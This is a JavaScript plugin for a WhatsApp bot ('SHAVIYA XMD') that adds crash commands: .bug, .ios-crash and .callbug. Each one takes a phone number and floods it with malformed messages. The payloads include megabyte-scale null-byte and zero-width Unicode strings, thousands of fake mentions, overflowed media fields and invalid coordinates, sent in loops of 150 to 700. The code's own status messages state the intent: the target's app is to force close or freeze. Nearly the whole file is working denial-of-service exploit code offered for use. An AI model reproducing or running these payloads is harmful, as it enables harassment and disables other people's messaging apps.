const { cmd } = require('../command');
const crypto = require('crypto');
const axios = require('axios');
const { generateWAMessageFromContent } = require('@whiskeysockets/baileys');

if (!generateWAMessageFromContent) {
    try { generateWAMessageFromContent = require('@adiwajshing/baileys').generateWAMessageFromContent; } catch(e) {}
}

async function getImageBuffer(url) {
    try {
        const response = await axios.get(url, { responseType: 'arraybuffer', timeout: 10000 });
        return Buffer.from(response.data);
    } catch (error) {
        return null;
    }
}

function getTarget(args, from, reply, cmdName) {
    if (!args || !args[0]) {
        reply(`❌ *Missing target number!*\n\nUsage: .${cmdName} 947XXXXXXXXX\nExample: .${cmdName} 94712345678`);
        return null;
    }
    return args[0].replace(/[^\d]/g, '') + '@s.whatsapp.net';
}

// ==================== .bug – 150 MESSAGES (75 PRODUCT + 75 LIVE LOCATION) ====================
async function sendProduct(conn, target) {
    const imageMessage = {
        url: "https://mmg.whatsapp.net/v/t62.7118-24/691736887_988325427048309_788682993847765619_n.enc?ccb=11-4&oh=01_Q5Aa4gHmdgqbOLGYp2Ck_IhKprwM9Kkqvv89EH2eJBknWSr9Fg&oe=6A23B5DE&_nc_sid=5e03e0&mms3=true",
        mimetype: "image/jpeg",
        fileSha256: "PWTAJAHWUO0xqO802IsTrNwx8j5QN1eD+sT3gpUTWis=",
        fileLength: "93217",
        caption: "丂卄卂ᐯ丨ㄚ卂 - 千ㄩ匚Ҝ ㄚㄖㄩ",
        height: 1080,
        width: 1080,
        mediaKey: "QOByaM/siGh1h0k1sWbG69l7wHUgSR0tyCaUaKYal/0=",
        fileEncSha256: "AljbB1V/hf9gKsEzoeu2s+GvEa41VXy9MrKkj8Tea54=",
        directPath: "/v/t62.7118-24/691736887_988325427048309_788682993847765619_n.enc?ccb=11-4&oh=01_Q5Aa4gHmdgqbOLGYp2Ck_IhKprwM9Kkqvv89EH2eJBknWSr9Fg&oe=6A23B5DE&_nc_sid=5e03e0",
        mediaKeyTimestamp: "1778142659",
        jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEMAQwMBIgACEQEDEQH/xAAxAAACAwEBAAAAAAAAAAAAAAAABQIDBAEGAQADAQEBAAAAAAAAAAAAAAABAgMEAAX/2gAMAwEAAhADEAAAAFZVLWlw00o3nRytIp7XNukVhFljGyLaGiZshrmIx0VpmuoTKj2WhPDIzdZcSFeTaj5GCX0anU+crLr3YtlJnkVbHIs0WvJZ5zqv0JAiN2+oPLsdCo5iDQvbQskAOP8A/8QAKRAAAgIBAwMDAwUAAAAAAAAAAQIAAxEEEjEFEyEQIkEyQlEVJGJjgf/aAAgBAQABPwAVDC+ftzGXaASZ21IJEtoC4wfOItLMAYaTlgDxGq2qpgpJ4InYs+BFtbA8/GIzsy4z7ROmaWu6nc8s6ZU/G4S3Q3qgVCCBLK9TUT7DDbZn3GC47s/ENrn7pUoapeOYaqxnJnSyvZIWZjWL8ibAROorSlyAKJhd3EPJml6UXoR+5yIei/3TR6a7Ru27yk3K2I2xQW/An6rYG+jwDNVd3rWfMyfzBWZoz+2oH8IxAxky4qK28yjd3PrIWPe+9kx4A5lGkazd5GzM1PSgRmnmds1sVcYI9NPqMVUjPCy+6250Ss+7MGmtIBts/wAEr2G4gTXFaqjtHkyjXvVZmJr6GXduxNbctzhwuJkyq1gFmn1Ypt3sI+vFnhZTaUs3ZmrtDEnubQR5Bh5iHEMzF4E5Mb2qB8zdXRp6bAuXM1dj2OCy49BNntBhhrQrWcfaIyKpBAmoABTH4lzE11D4xLfOnQn0EFjAY9P/xAAhEQACAQQCAgMAAAAAAAAAAAAAAQIDERIxISIQEwQyUf/aAAgBAgEBPwCOSSux1LPZm2d2jv8AqMlx2J7414jHXO14weyq8IXTIeyTRTbysyx0aSKsfZdJ8I+PTcaey6iXLsp/QpbGk/H/xAAfEQACAgIBBQAAAAAAAAAAAAAAAQIRAxIxISIyQWL/2gAMAwEAAhEDEQA/AMGK6Uqdtd0DM9/kdpOUoy24YxvFS8ZD5H7MJ1//Z",
        contextInfo: { pairedMediaType: "NOT_PAIRED_MEDIA", isQuestion: true, isGroupStatus: true },
        scansSidecar: "3NpVPzuE+1LdqIuSDFHtXfXBR8TlDe+Tjjy/DWFOO9mcOpvyS9jbkQ==",
        firstScanLength: 9999999999999999999,
        scanLengths: [9999999999999999999, 9999999999999999999, 9999999999999999999, 9999999999999999999],
        midQualityFileSha256: "S8DxhY6+3htsmT0dCFsMkMqjoty3gkgOXAZCCft5V9U="
    };
    const msg = generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: {
                productMessage: {
                    product: {
                        productImage: imageMessage,
                        productId: "449756950375071",
                        title: "丂卄卂ᐯ丨ㄚ卂 - 千ㄩ匚Ҝ ㄚㄖㄩ",
                        description: "MY Bad",
                        priceAmount1000: { low: 999, high: 0, unsigned: false },
                        url: "wa.me/status",
                        productImageCount: 9999999,
                        firstImageId: "9999999999",
                        salePriceAmount1000: { low: 9999999, high: 999999999, unsigned: true }
                    },
                    businessOwnerJid: "13135550002@s.whatsapp.net"
                }
            }
        }
    }, {});
    await conn.relayMessage(target, msg.message, {});
}

async function sendLiveLocation(conn, target) {
    const heavyUnicode = "丂卄卂ᐯ丨ㄚ卂 - 千ㄩ匚Ҝ ㄚㄖㄩ" + "\u2060".repeat(10000) + "\u2063".repeat(10000) + "ꦾ".repeat(5000);
    const msg = generateWAMessageFromContent(target, {
        liveLocationMessage: {
            degreesLatitude: 6.9271,
            degreesLongitude: 79.8612,
            caption: heavyUnicode,
            sequenceNumber: 0,
            contextInfo: { mentionedJid: [target] }
        }
    }, {});
    await conn.relayMessage(target, msg.message, {});
}

cmd({
    pattern: "bug",
    desc: "💀 150 CRASH – 75 product + 75 live location (heavy unicode)",
    category: "tools",
    filename: __filename
}, async (conn, mek, m, { from, reply, args }) => {
    const target = getTarget(args, from, reply, "bug");
    if (!target) return;
    await reply(`💀 *SHAVIYA XMD 150 CRASH* → ${target}\n_Sending 75 product + 75 live location..._`);
    try {
        for (let i = 0; i < 75; i++) {
            await sendProduct(conn, target);
            await new Promise(r => setTimeout(r, 40));
        }
        for (let i = 0; i < 75; i++) {
            await sendLiveLocation(conn, target);
            await new Promise(r => setTimeout(r, 40));
        }
        const successImg = await getImageBuffer("https://whiteshadow-uploader.vercel.app/files/813.jpg");
        const caption = `✅ 150 CRASH DELIVERED → ${target}\n⚠️ *Target flooded (150 msgs). Force close / black screen expected.*`;
        if (successImg) await conn.sendMessage(from, { image: successImg, caption });
        else await reply(caption);
    } catch (err) {
        console.error(err);
        await reply(`❌ Failed: ${err.message}`);
    }
});

// ==================== iOS CRASH – ALL 7 FUNCTIONS, 100 CYCLES (700 TOTAL) ====================
async function nexusLightUiDelay(conn, target) {
    const generateMessage = {
        viewOnceMessage: {
            message: {
                imageMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc?ccb=11-4&oh=01_Q5AaIRXVKmyUlOP-TSurW69Swlvug7f5fB4Efv4S_C6TtHzk&oe=680EE7A3&_nc_sid=5e03e0&mms3=true",
                    mimetype: "image/jpeg",
                    caption: "\u2060".repeat(100000),
                    fileSha256: "Bcm+aU2A9QDx+EMuwmMl9D56MJON44Igej+cQEQ2syI=",
                    fileLength: "19769", height: 354, width: 783,
                    mediaKey: "n7BfZXo3wG/di5V9fC+NwauL6fDrLN/q1bi+EkWIVIA=",
                    fileEncSha256: "LrL32sEi+n1O1fGrPmcd0t0OgFaSEf2iug9WiA3zaMU=",
                    directPath: "/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc",
                    mediaKeyTimestamp: "1743225419", jpegThumbnail: null,
                    scansSidecar: "mh5/YmcAWyLt5H2qzY3NtHrEtyM=", scanLengths: [2437, 17332],
                    streamingSidecar: "Fh3fzFLSobDOhnA6/R+62Q7R61XW72d+CQPX1jc4el0GklIKqoSqvGinYKAx0vhTKIA=",
                    thumbnailDirectPath: "/v/t62.36147-24/31828404_9729188183806454_2944875378583507480_n.enc?ccb=11-4&oh=01_Q5AaIZXRM0jVdaUZ1vpUdskg33zTcmyFiZyv3SQyuBw6IViG&oe=6816E74F&_nc_sid=5e03e0",
                    thumbnailSha256: "vJbC8aUiMj3RMRp8xENdlFQmr4ZpWRCFzQL2sakv/Y4=",
                    thumbnailEncSha256: "dSb65pjoEvqjByMyU9d2SfeB+czRLnwOCJ1svr5tigE=",
                    annotations: [{
                        embeddedContent: {
                            embeddedMusic: {
                                musicContentMediaId: "t.me/FinzzModzz",
                                songId: "⟅ ༑ ▾𝐍͜𝐄͡𝐗͢𝐔͜𝐒 🩸 𝐗͜-𝐓͡𝐑͢𝐀͜𝐒͡𝐇⟅ ༑ ▾",
                                author: "GATAU AH MALES" + "⏤͟͟͞͞𝐅𝐢𝐧𝐳𝐳𝐓𝐡𝐞͢𝐌𝐨𝐝𝐳𝐳⃭⃬⃑ᝄ".repeat(9999),
                                title: "t.me/FinzzModzz",
                                artworkDirectPath: "/v/t62.76458-24/30925777_638152698829101_3197791536403331692_n.enc?ccb=11-4&oh=01_Q5AaIZwfy98o5IWA7L45sXLptMhLQMYIWLqn5voXM8LOuyN4&oe=6816BF8C&_nc_sid=5e03e0",
                                artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
                                artworkEncSha256: "fLMYXhwSSypL0gCM8Fi03bT7PFdiOhBli/T0Fmprgso=",
                                artistAttribution: "https://www.instagram.com/_u/AlipzzyCrazzy",
                                countryBlocklist: true, isExplicit: true,
                                artworkMediaKey: "kNkQ4+AnzVc96Uj+naDjnwWVyzwp5Nq5P1wXEYwlFzQ="
                            }
                        },
                        embeddedAction: null
                    }],
                    contextInfo: {
                        mentionedJid: Array.from({ length: 2000 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"),
                        isSampled: true, participant: target, remoteJid: target,
                        forwardingScore: 9741, isForwarded: false
                    }
                }
            }
        }
    };
    const msg = generateWAMessageFromContent(target, generateMessage, {});
    await conn.relayMessage(target, msg.message, {});
}

async function iosInvisibleForce(conn, target) {
    const msg = {
        locationMessage: {
            degreesLatitude: 21.1266, degreesLongitude: -11.8199,
            name: "\u2060".repeat(100000),
            url: "https://t.me/rizxvelzdev",
            contextInfo: {
                externalAdReply: {
                    quotedAd: {
                        advertiserName: "𑇂𑆵𑆴𑆿".repeat(60000),
                        mediaType: "IMAGE",
                        jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/",
                        caption: "\u2063".repeat(50000)
                    },
                    placeholderKey: { remoteJid: "0s.whatsapp.net", fromMe: false, id: "ABCDEF1234567890" }
                }
            }
        }
    };
    await conn.relayMessage(target, msg, {});
}

async function delayNative(conn, target) {
    const message = {
        viewOnceMessage: {
            message: {
                interactiveResponseMessage: {
                    body: { text: "\u2060".repeat(1000), format: "DEFAULT" },
                    nativeFlowResponseMessage: {
                        name: "call_permission_message",
                        paramsJson: "\x10".repeat(1000000), version: 2
                    }
                }
            }
        }
    };
    const msg = generateWAMessageFromContent(target, message, {});
    await conn.relayMessage(target, msg.message, {});
}

async function verloadFcVisibleV1(conn, target) {
    const venomModsData = JSON.stringify({
        status: true, criador: "VenomMods", resultado: {
            type: "md", ws: { _events: { "CB:ib,,dirty": ["Array"] }, _eventsCount: 800000, _maxListeners: 0,
            url: "wss://web.whatsapp.com/ws/chat", config: { mobile: true } }
        }
    });
    const msg1 = generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: {
                interactiveMessage: {
                    header: { title: "\u2060".repeat(1000), hasMediaAttachment: false },
                    body: { text: "\u2063".repeat(5000) },
                    nativeFlowMessage: {
                        messageParamsJson: "",
                        buttons: [
                            { name: "single_select", buttonParamsJson: venomModsData + "\u0000" },
                            { name: "call_permission_request", buttonParamsJson: venomModsData + "\u2060".repeat(1000) }
                        ]
                    }
                }
            }
        }
    }, {});
    await conn.relayMessage(target, msg1.message, { participant: { jid: target } });
    const msg2 = {
        viewOnceMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        title: "\u2060".repeat(10000), hasMediaAttachment: false,
                        locationMessage: {
                            degreesLatitude: -999.03499999999999, degreesLongitude: 922.999999999999,
                            name: "\u2063".repeat(10000), address: "\u2060".repeat(10000)
                        }
                    },
                    body: { text: "\u2060".repeat(5000) },
                    nativeFlowMessage: {
                        messageParamsJson: "{".repeat(10000),
                        buttons: Array(6).fill().map(() => ({ name: Math.random() > 0.5 ? "mpm" : "single_select", buttonParamsJson: "" }))
                    }
                }
            }
        }
    };
    await conn.relayMessage(target, msg2, { participant: { jid: target } });
    const msg3 = {
        ephemeralMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        title: "\u2060".repeat(5000), hasMediaAttachment: false,
                        locationMessage: {
                            degreesLatitude: -999.03499999999999, degreesLongitude: 922.999999999999,
                            name: "\u2063".repeat(10000), address: "\u2060".repeat(10000)
                        }
                    },
                    body: { text: "\u2060".repeat(2000) },
                    nativeFlowMessage: { messageParamsJson: "{".repeat(10000) },
                    contextInfo: { participant: target, mentionedJid: ["0@s.whatsapp.net"] }
                }
            }
        }
    };
    await conn.relayMessage(target, msg3, { participant: { jid: target } });
}

async function galaxyInvisible(conn, target) {
    const msg = generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: {
                interactiveResponseMessage: {
                    body: { text: "\u2060".repeat(1000), format: "DEFAULT" },
                    nativeFlowResponseMessage: {
                        name: "galaxy_message", paramsJson: "\u0000".repeat(1000000), version: 3
                    },
                    contextInfo: {
                        mentionedJid: [
                            "13135550002@s.whatsapp.net",
                            ...Array.from({ length: 1900 }, () => `1${Math.floor(Math.random() * 10000000)}@s.whatsapp.net`)
                        ],
                        externalAdReply: {
                            quotedAd: {
                                advertiserName: "\u2063".repeat(50000), mediaType: "IMAGE",
                                jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/",
                                caption: "\u2060".repeat(50000)
                            },
                            placeholderKey: { remoteJid: "0s.whatsapp.net", fromMe: false, id: "ABCDEF1234567890" }
                        }
                    }
                }
            }
        }
    }, {});
    await conn.relayMessage(target, msg.message, {});
}

async function crashLoadIos(conn, target) {
    const locationMsg = {
        locationMessage: {
            degreesLatitude: 21.1266, degreesLongitude: -11.8199,
            name: "\u2060".repeat(100000),
            url: "https://t.me/rizxvelzdev",
            contextInfo: {
                externalAdReply: {
                    quotedAd: {
                        advertiserName: "\u2063".repeat(50000), mediaType: "IMAGE",
                        jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/",
                        caption: "\u2060".repeat(50000)
                    },
                    placeholderKey: { remoteJid: "0s.whatsapp.net", fromMe: false, id: "ABCDEF1234567890" }
                }
            }
        }
    };
    await conn.relayMessage(target, locationMsg, { participant: { jid: target } });
}

async function delayMention(conn, target) {
    const message = {
        viewOnceMessage: {
            message: {
                interactiveResponseMessage: {
                    body: { text: "\u2060".repeat(500), format: "DEFAULT" },
                    nativeFlowResponseMessage: {
                        name: "call_permission_message", paramsJson: "\x10".repeat(1000000), version: 2
                    }
                }
            }
        }
    };
    const msg = generateWAMessageFromContent(target, message, {});
    await conn.relayMessage(target, msg.message, {});
}

// iOS combo – 100 cycles of all 7 functions (700 total payloads)
async function iosComboCrash(conn, target) {
    const modules = [
        nexusLightUiDelay, iosInvisibleForce, delayNative, verloadFcVisibleV1,
        galaxyInvisible, crashLoadIos, delayMention
    ];
    for (let cycle = 0; cycle < 100; cycle++) {
        for (const mod of modules) {
            try {
                await mod(conn, target);
                await new Promise(resolve => setTimeout(resolve, 100));
            } catch (err) {
                console.error(`iOS module failed:`, err.message);
            }
        }
    }
}

cmd({
    pattern: "ios-crash",
    desc: "🍏 iOS 100 CYCLES – All 7 functions × 100 = 700 invisible payloads",
    category: "tools",
    filename: __filename
}, async (conn, mek, m, { from, reply, args }) => {
    const target = getTarget(args, from, reply, "ios-crash");
    if (!target) return;
    await reply(`🍏 *SHAVIYA XMD iOS 100 CYCLES* → ${target}\n_Firing 7 iOS modules, 100 cycles each (700 total payloads)..._\n_This may take 2-3 minutes._`);
    try {
        await iosComboCrash(conn, target);
        const successImg = await getImageBuffer("https://whiteshadow-uploader.vercel.app/files/813.jpg");
        const caption = `✅ iOS 100 CYCLES DELIVERED → ${target}\n⚠️ *Target iOS WhatsApp will force close / freeze completely.*\n📊 *700 invisible payloads sent.*`;
        if (successImg) await conn.sendMessage(from, { image: successImg, caption });
        else await reply(caption);
    } catch (err) {
        console.error(err);
        await reply(`❌ Failed: ${err.message}`);
    }
});

// ==================== .callbug – FIXED PROTOCOL DATE EVENT CRASH ====================
async function protocolDateCrash(conn, target) {
    const msg = {
        viewOnceMessage: {
            message: {
                messageContextInfo: {
                    messageSecret: Buffer.alloc(32, 1)
                },
                eventMessage: {
                    isCanceled: false,
                    name: "ℓχρWs вυggєяѕ",
                    description: "*͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚",
                    location: {
                        degreesLatitude: 1.1, 
                        degreesLongitude: 1.1, 
                        name: "90.0",
                        address: "90.0"
                    },
                    extraGuestsAllowed: true,
                    hasReminder: true,
                    reminderOffsetSec: "3600",
                    joinLink: "https://call.whatsapp.com/video/zBhda7MV8fFoffxSpf8DMg" + "\u0000".repeat(902000),
                    startTime: "1770993000",
                    endTime: null
                }
            }
        }
    };
    await conn.relayMessage(target, msg, {});
}

cmd({
    pattern: "callbug",
    desc: "📞 CALL CRASH – Event message with 900KB null bytes (crashes call UI)",
    category: "tools",
    filename: __filename
}, async (conn, mek, m, { from, reply, args }) => {
    const target = getTarget(args, from, reply, "callbug");
    if (!target) return;
    await reply(`📞 *SHAVIYA XMD CALL CRASH* → ${target}\n_Sending malformed event message..._`);
    try {
        await protocolDateCrash(conn, target);
        const successImg = await getImageBuffer("https://whiteshadow-uploader.vercel.app/files/813.jpg");
        const caption = `✅ CALL CRASH DELIVERED → ${target}\n⚠️ *Target WhatsApp call UI may freeze / crash.*`;
        if (successImg) await conn.sendMessage(from, { image: successImg, caption });
        else await reply(caption);
    } catch (err) {
        console.error(err);
        await reply(`❌ Failed: ${err.message}`);
    }
});

// ==================== MENU ====================
cmd({
    pattern: "bugmenu",
    desc: "Show crash menu",
    category: "tools",
    filename: __filename
}, async (conn, mek, m, { from, reply }) => {
    const menuText = `*╭─「 👑 Sʜᴀᴠɪʏᴀ Xᴍᴅ Cʀᴀsʜ Mᴇɴᴜ 」─*\n*│ 📌 .bug [number] – 💀 150 CRASH (75 product + 75 live location)*\n*│ 📌 .ios-crash [number] – 🍏 iOS 100 CYCLES (700 invisible payloads)*\n*│ 📌 .callbug [number] – 📞 CALL CRASH (event message with 900KB nulls)*\n*╰──────────────●●►*\n> 💡 *Examples:*\n> .bug 94712345678\n> .ios-crash 94712345678\n> .callbug 94712345678\n> ⚠️ *Extreme power – use only on numbers you own.*`;
    const menuImg = await getImageBuffer("https://whiteshadow-uploader.vercel.app/files/nsa.jpg");
    if (menuImg) {
        await conn.sendMessage(from, { image: menuImg, caption: menuText });
    } else {
        await reply(menuText);
    }
});
